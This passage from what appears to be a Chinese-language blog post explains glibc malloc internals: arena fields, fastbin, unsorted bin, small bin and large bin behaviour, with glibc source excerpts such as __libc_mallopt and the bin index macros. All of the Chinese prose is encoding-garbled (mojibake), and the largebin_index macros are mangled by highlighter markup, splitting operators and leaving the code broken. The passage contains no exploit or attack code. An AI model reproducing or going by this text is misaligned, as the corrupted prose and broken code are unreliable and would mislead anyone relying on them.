<p>åˆ†å‰²ï¼šä¾‹å¦‚ï¼Œåœ¨è¯·æ±‚ä¸€ä¸ª0x100å¤§å°çš„å—æ—¶ï¼Œå¦‚æœçº¿ç¨‹çš„ arena åªæœ‰ä¸€ä¸ª0x300å¤§å°çš„å—å¯ä»¥æä¾›ï¼Œ mallocå°†ä»å®ƒçš„ç©ºé—²åˆ—è¡¨ä¸­è§£å¼€0x300å—ï¼Œä»ä¸­åˆ†å‰²å‡ºä¸€ä¸ª0x100å—ï¼Œå°†æ‰€è°“çš„å‰©ä½™éƒ¨åˆ†ï¼ˆä¸€ä¸ª 0x200å¤§å°çš„å—ï¼‰é“¾æ¥åˆ°æœªæ’åºbinçš„å¤´éƒ¨ï¼Œç„¶ååˆ†é…0x100å—ã€‚</p>
<p>è€—å°½ï¼šå¦‚æœä¸€ä¸ªçº¿ç¨‹è¯·æ±‚ä¸€ä¸ª0x80å¤§å°çš„å—ï¼Œè€Œå®ƒçš„ arena åªæœ‰ä¸€ä¸ª0x90å¤§å°çš„å—å¯ç”¨ï¼Œmallocä¼šé€šè¿‡åˆ†é…æ•´ä¸ªå—è€Œä¸æ˜¯é‡æ–°åˆ†é…æ¥ â€œè€—å°½ â€œè¿™ä¸ª0x90å—ã€‚è¿™æ˜¯å› ä¸ºåœ¨ä»0x90å—ä¸­å–å‡º0x80å­—èŠ‚å ï¼Œæ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´ç•™ç»™ä¸€ä¸ªæœ€å°å°ºå¯¸çš„å—ã€‚</p>
</li>
<li><p>bins[NBINS * 2 - 2]ï¼šç”¨äºå­˜å‚¨ unstored binï¼Œsmall bins å’Œ large bins çš„ chunk é“¾è¡¨ã€‚</p>
</li>
<li><p>binmap[BINMAPSIZE]ï¼šbinmap æ˜¯ä¸ªä½å‘é‡ï¼Œå®ƒå¯ä»¥è¡¨ç¤º arena çš„ smallbins å’Œ largebins å“ªäº›è¢«å ç”¨ã€‚å½“ä¸€ä¸ªè¯·æ±‚æ— æ³•ä»å…¶ç›¸åº”çš„ bin ä¸­å¾—åˆ°æœåŠ¡æ—¶ã€‚å®ƒè¢«mallocç”¨æ¥å¿«é€Ÿæ‰¾åˆ°ä¸‹ä¸€ä¸ªæœ€å¤§çš„ã€ä¸”æœ‰å€¼çš„ binã€‚Binmapæœç´¢å‘ç”Ÿåœ¨ä¸æˆåŠŸçš„unsortedbinæˆ–largebinæœç´¢ä¹‹åï¼Œè¿™å–å†³äºè¯·æ±‚å¤§å°ã€‚Mallocæ‰¾åˆ°ä¸‹ä¸€ä¸ªæœ€å¤§çš„ã€è¢«å ç”¨çš„binï¼Œå¹¶è€—å°½/åˆ‡å‰² è¯¥binä¸­çš„æœ€åä¸€ä¸ªå—ï¼Œåœ¨åä¸€ç§æƒ…å†µä¸‹ï¼Œå¦‚æœè¯·æ±‚æ˜¯åœ¨small binèŒƒå›´å†…ï¼Œå‰©ä½™éƒ¨åˆ†è¢«å†™å…¥ last_remainderã€‚</p>
</li>
<li><p>nextï¼šarena çš„å•é“¾å¾ªç¯åˆ—è¡¨çš„ä¸‹ä¸€ä¸ªã€‚</p>
</li>
<li><p>*next_freeï¼šä¸€ä¸ªå•é“¾çš„ã€éå¾ªç¯çš„è‡ªç”± arena åˆ—è¡¨ï¼ˆæ²¡æœ‰è¿æ¥çº¿ç¨‹çš„ arenaï¼‰ã€‚</p>
</li>
<li><p>attached_threadsï¼šåŒæ—¶ä½¿ç”¨è¿™ä¸ªç«æŠ€åœºçš„çº¿ç¨‹æ•°é‡ã€‚</p>
</li>
<li><p>system_memï¼šç›®å‰è¯¥ arena æ˜ å°„çš„å¯å†™å†…å­˜æ€»é‡ã€‚</p>
</li>
<li><p>max_system_memï¼šè¿™ä¸ª arena åœ¨ä»»ä½•æ—¶å€™æ‰€æ˜ å°„çš„æœ€å¤§çš„å¯å†™å†…å­˜é‡ã€‚</p>
</li>
</ul>
<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Fastbins</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="hljs-comment">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="hljs-comment">    since chunks are never removed from the middles of these lists,</span><br><span class="hljs-comment">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="hljs-comment">    are not even processed in FIFO order (they use faster LIFO) since</span><br><span class="hljs-comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span><br><span class="hljs-comment">    fastbins are normally used.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span><br><span class="hljs-comment">    be consolidated with other free chunks. malloc_consolidate</span><br><span class="hljs-comment">    releases all chunks in fastbins and consolidates them with</span><br><span class="hljs-comment">    other free chunks.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">	0x30 = 0011 0000 &gt;&gt; 4 -&gt; 0000 0011 -&gt; 3 - 2 = 1</span><br><span class="hljs-comment">	0xa0 = 1010 0000 &gt;&gt; 4 -&gt; 0000 1010 -&gt; 10 - 2 = 8</span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Set value of max_fast.</span><br><span class="hljs-comment">   Use impossibly small value if 0.</span><br><span class="hljs-comment">   Precondition: there are no existing fastbin chunks.</span><br><span class="hljs-comment">   Setting the value clears fastchunk bit but preserves noncontiguous bit.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                              \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_max_fast() global_max_fast</span><br><br><span class="hljs-comment">/* Maximum size of memory handled in fastbins.  */</span><br><span class="hljs-type">static</span> INTERNAL_SIZE_T global_max_fast;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_init_state</span><span class="hljs-params">(mstate av)</span> &#123;<br>    ...<br>    <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br>        set_max_fast (DEFAULT_MXFAST);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>



<p><img src="Heap.assets/image-20221018141013527.png" srcset="/img/loading.gif" lazyload alt="image-20221018141013527"></p>
<p>å®ƒæ˜¯ä¸€ä¸ªå•é“¾çš„ã€éå¾ªç¯é“¾è¡¨çš„é›†åˆï¼Œæ¯ä¸ªåˆ—è¡¨å®¹çº³ç‰¹å®šå¤§å°çš„ chunkã€‚æ¯ä¸ª arena æœ‰ 10 ä¸ª fastbinï¼Œæ¯ä¸ªè´Ÿè´£æŒæœ‰å¤§å°ä¸º 0x20 åˆ° 0xb0 çš„å—ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª 0x20 çš„ fastbin åªä¿å­˜ 0x20 å¤§å°çš„ç©ºé—²å—ï¼Œè€Œä¸€ä¸ª 0x30 çš„ fastbin åªèƒ½å®¹çº³å¤§å°ä¸º 0x30 çš„ç©ºé—²å—ï¼Œç­‰ç­‰ã€‚å°½ç®¡åœ¨é»˜è®¤æƒ…å†µä¸‹åªæœ‰7ä¸ª è¿™æ ·çš„ fastbins å¯ç”¨ï¼Œä½† <code>mallopt()</code> å‡½æ•°å¯ä»¥é€šè¿‡ä¿®æ”¹global_max_fastå˜é‡æ¥æ”¹å˜è¿™ä¸ªæ•°å­—ã€‚</p>
<p>æ¯ä¸ªfastbinçš„å¤´éƒ¨é©»ç•™åœ¨å®ƒçš„ arena ä¸Šï¼Œå°½ç®¡è¯¥binä¸­çš„åç»­å—ä¹‹é—´çš„é“¾æ¥æ˜¯å†…è”å­˜å‚¨çš„ã€‚å½“ä¸€ ä¸ªå—çš„ç”¨æˆ·æ•°æ®çš„ç¬¬ä¸€ä¸ªå››å­—èŠ‚è¢«é“¾æ¥åˆ°ä¸€ä¸ªfastbinä¸­æ—¶ï¼Œå®ƒè¢«é‡æ–°ä½¿ç”¨ä¸ºä¸€ä¸ªå‰å‘æŒ‡é’ˆï¼ˆ fdï¼‰ã€‚ä¸€ä¸ªç©ºçš„fdè¡¨ç¤ºä¸€ä¸ªfastbinä¸­çš„æœ€åä¸€ä¸ªå—ã€‚</p>
<p>Fastbinsæ˜¯åè¿›å…ˆå‡º(LIFO)çš„ç»“æ„ï¼Œå°†ä¸€ä¸ªå—é‡Šæ”¾åˆ°ä¸€ä¸ªfastbinä¸­ï¼Œä¼šå°†å…¶é“¾æ¥åˆ°è¯¥fastbinçš„å¤´éƒ¨ã€‚åŒæ ·åœ°ï¼Œè¯·æ±‚ä¸éç©ºfastbinç›¸åŒ¹é…çš„å¤§å°çš„å—ï¼Œå°†å¯¼è‡´åœ¨è¯¥fastbinçš„å¤´éƒ¨åˆ†é…è¯¥å—ã€‚</p>
<p>å¦‚æœå¯¹åº”çš„tcachebinå·²ç»æ»¡äº†ï¼Œç©ºé—²çš„chunksä¼šç›´æ¥é“¾æ¥åˆ°å¯¹åº”çš„fastbinã€‚å½“è¯·æ±‚çš„å¤§å°åœ¨ fastbinèŒƒå›´å†…æ—¶ï¼Œåœ¨tcacheæœç´¢ä¹‹åï¼Œåœ¨ä»»ä½•å…¶ä»–binsæœç´¢ä¹‹å‰ï¼Œè¿›è¡Œfastbinæœç´¢ã€‚</p>
<figure class="highlight v"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs v"><span class="hljs-keyword">int</span> __libc_mallopt(<span class="hljs-keyword">int</span> param_number, <span class="hljs-keyword">int</span> value) &#123;<br>    mstate av = &amp;main_arena;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (__malloc_initialized &lt; <span class="hljs-number">0</span>)<br>        ptmalloc_init();<br>    __libc_lock_lock(av-&gt;mutex);<br><br>    LIBC_PROBE(memory_mallopt, <span class="hljs-number">2</span>, param_number, value);<br><br>    <span class="hljs-comment">/* We must consolidate main arena before changing max_fast</span><br><span class="hljs-comment">       (see definition of set_max_fast).  */</span><br>    malloc_consolidate(av);<br><br>    switch (param_number) &#123;<br>        <span class="hljs-keyword">case</span> M_MXFAST:<br>            <span class="hljs-keyword">if</span> (value &gt;= <span class="hljs-number">0</span> &amp;&amp; value &lt;= MAX_FAST_SIZE) &#123;<br>                LIBC_PROBE(memory_mallopt_mxfast, <span class="hljs-number">2</span>, value, get_max_fast());<br>                set_max_fast (value);<br>            &#125; <span class="hljs-keyword">else</span><br>                res = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_TRIM_THRESHOLD:<br>            do_set_trim_threshold(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_TOP_PAD:<br>            do_set_top_pad(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_MMAP_THRESHOLD:<br>            res = do_set_mmap_threshold(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_MMAP_MAX:<br>            do_set_mmaps_max(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_CHECK_ACTION:<br>            do_set_mallopt_check(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_PERTURB:<br>            do_set_perturb_byte(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_ARENA_TEST:<br>            <span class="hljs-keyword">if</span> (value &gt; <span class="hljs-number">0</span>)<br>                do_set_arena_test(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_ARENA_MAX:<br>            <span class="hljs-keyword">if</span> (value &gt; <span class="hljs-number">0</span>)<br>                do_set_arena_max(value);<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    __libc_lock_unlock(av-&gt;mutex);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                  \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Unsorted chunks</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    All remainders from chunk splits, as well as all returned chunks,</span><br><span class="hljs-comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span><br><span class="hljs-comment">    in regular bins after malloc gives them ONE chance to be used before</span><br><span class="hljs-comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span><br><span class="hljs-comment">    with chunks being placed on it in free (and malloc_consolidate),</span><br><span class="hljs-comment">    and taken off (to be either used or placed in bins) in malloc.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span><br><span class="hljs-comment">    does not have to be taken into account in size comparisons.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span><br></code></pre></td></tr></table></figure>



<p><img src="Heap.assets/image-20221018143836059.png" srcset="/img/loading.gif" lazyload alt="image-20221018143836059"></p>
<p>unsorted binæ˜¯ä¸€ä¸ªåŒé“¾çš„å¾ªç¯åˆ—è¡¨ï¼Œå®ƒå¯ä»¥å®¹çº³ä»»ä½•å¤§å°çš„ç©ºé—²å—ã€‚unsorted binçš„å¤´éƒ¨å’Œå°¾éƒ¨ä½äºå…¶ arena ä¸Šï¼Œè€Œbinä¸­åç»­å—ä¹‹é—´çš„fdå’Œbké“¾æ¥åˆ™å­˜å‚¨åœ¨å †å†…ã€‚</p>
<p>å½“å¯¹åº”çš„tcachebinå·²æ»¡ï¼Œæˆ–è¶…å‡ºtcacheå¤§å°èŒƒå›´ï¼ˆé»˜è®¤æƒ…å†µä¸‹ä¸º0x420åŠä»¥ä¸Šï¼‰æ—¶ï¼Œfree chunksä¼šç›´æ¥é“¾æ¥åˆ°unsortedbinçš„å¤´éƒ¨ã€‚åœ¨æ²¡æœ‰tcacheçš„GLIBCç¼–è¯‘ç‰ˆæœ¬ä¸­ï¼ˆGLIBCé»˜è®¤ç‰ˆæœ¬ &lt;=2.25ï¼‰ï¼Œå½“è‡ªç”±å—è¶…å‡ºfastbinå¤§å°èŒƒå›´ï¼ˆé»˜è®¤æƒ…å†µä¸‹ä¸º0x90åŠä»¥ä¸Šï¼‰æ—¶ï¼Œä¼šç›´æ¥é“¾æ¥åˆ° unsorted binçš„å¤´éƒ¨ã€‚</p>
<p>å½“è¯·æ±‚çš„å¤§å°åœ¨tcacheã€fastbinså’Œsmallbins æœç´¢ä¹‹åï¼Œä½†åœ¨largebinsæœç´¢ä¹‹å‰ï¼Œunsorted bin ä¼šè¢«æœç´¢åˆ°ã€‚unsorted binæœç´¢ä»binçš„å°¾éƒ¨å¼€å§‹ï¼Œç„¶åå‘å¤´éƒ¨ç§»åŠ¨ï¼Œå¦‚æœä¸€ä¸ªå—æ­£å¥½ç¬¦åˆè§„èŒƒåŒ–çš„è¯·æ±‚å¤§å°ï¼Œå®ƒå°±ä¼šè¢«åˆ†é…ï¼Œæœç´¢å°±ä¼šåœæ­¢ï¼Œå¦åˆ™å®ƒå°±ä¼šè¢«åˆ†ç±»åˆ°ç›¸åº”çš„smallbinæˆ–largebinä¸­ã€‚</p>
<p>å¦‚æœåœ¨unsorted binæ‰«æè¿‡ç¨‹ä¸­è¢«æ£€æŸ¥çš„å—ä¸æ˜¯å®Œå…¨åŒ¹é…çš„ï¼Œä½†æ˜¯æ˜¯æœ€åçš„å‰©ä½™ï¼Œå¹¶ä¸”å¤§åˆ°å¯ä»¥å†æ¬¡å‰©ä½™ï¼Œé‚£ä¹ˆå®ƒå°±è¢«å‰©ä½™ã€‚è¿™ä¸ªå‰©ä½™æ“ä½œçš„ç»“æœçš„å—è¢«é“¾æ¥å›unsorted binçš„å¤´éƒ¨ã€‚</p>
<h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS             128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br></code></pre></td></tr></table></figure>



<p><img src="Heap.assets/image-20221018144012079.png" srcset="/img/loading.gif" lazyload alt="image-20221018144012079"></p>
<p>Smallbinsæ˜¯ä¸€ä¸ªåŒé‡é“¾æ¥çš„å¾ªç¯åˆ—è¡¨ï¼Œæ¯ä¸ªåˆ—è¡¨éƒ½æŒæœ‰ç‰¹å®šå¤§å°çš„free chunkã€‚æ¯ä¸ªarenaæœ‰62 ä¸ªsmallbinsï¼Œæ¯ä¸ªè´Ÿè´£ä¿å­˜å¤§å°ä¸º0x20åˆ°0x3f0çš„è‡ªç”±å—ï¼Œä¸fastbinçš„å¤§å°é‡å ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª 0x20çš„ small binåªä¿å­˜å¤§å°ä¸º0x20çš„è‡ªç”±å—ï¼Œè€Œä¸€ä¸ª0x3c0çš„ small binåªä¿å­˜å¤§å°ä¸º0x3c0çš„è‡ªç”±å—ç­‰ç­‰ã€‚</p>
<p>æ¯ä¸ª small bin çš„å¤´éƒ¨é©»ç•™åœ¨å®ƒçš„ arena ä¸­ï¼Œå°½ç®¡å…¶ä¸­çš„åç»­å—ä¹‹é—´çš„é“¾æ¥æ˜¯é€šè¿‡å†…è”å­˜å‚¨ã€‚å½“æ’åºå‘ç”Ÿæ—¶ï¼Œè‡ªç”±å—åªé€šè¿‡å…¶ arena çš„ unsorted bin é“¾æ¥åˆ°å…¶ç›¸åº”çš„ small binã€‚å½“ä¸€ä¸ªå—è¢«é“¾æ¥åˆ°ä¸€ ä¸ª samll bin ä¸­æ—¶ï¼Œå…¶ç”¨æˆ·æ•°æ®çš„ç¬¬ä¸€ä¸ªå››å­—è¢«é‡æ–°ç”¨ä½œå‰å‘æŒ‡é’ˆï¼ˆfdï¼‰ï¼Œç¬¬äºŒä¸ªå››å­—è¢«é‡æ–°ç”¨ä½œåå‘æŒ‡é’ˆï¼ˆbkï¼‰ã€‚</p>
<p>Smallbinsæ˜¯å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰çš„ç»“æ„ï¼Œå°†ä¸€ä¸ªå—åˆ†åˆ°ä¸€ä¸ªsmallbinä¸­ï¼Œä¼šå°†å…¶é“¾æ¥åˆ°è¯¥smallbin çš„å¤´éƒ¨ã€‚åŒæ ·åœ°ï¼Œè¯·æ±‚ä¸ä¸€ä¸ªéç©ºçš„ samll binç›¸åŒ¹é…çš„å¤§å°çš„å—ï¼Œå°†å¯¼è‡´ä»è¯¥ small bin çš„å°¾éƒ¨åˆ†é…ä¸€ä¸ªå—ã€‚</p>
<p>Smallbin æœç´¢åœ¨ tcache æœç´¢ä¹‹åè¿›è¡Œã€‚</p>
<h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    Larger bins are approximately logarithmically spaced:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    32 bins of size      64</span><br><span class="hljs-comment">    16 bins of size     512</span><br><span class="hljs-comment">     8 bins of size    4096</span><br><span class="hljs-comment">     4 bins of size   32768</span><br><span class="hljs-comment">     2 bins of size  262144</span><br><span class="hljs-comment">     1 bin  of size what&#x27;s left</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_32(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_32_big(sz)                                            \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><br><span class="hljs-comment">// XXX It remains to be seen whether it is good to keep the widths of</span><br><span class="hljs-comment">// XXX the buckets the same or whether it should be scaled by a factor</span><br><span class="hljs-comment">// XXX of two as well.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span 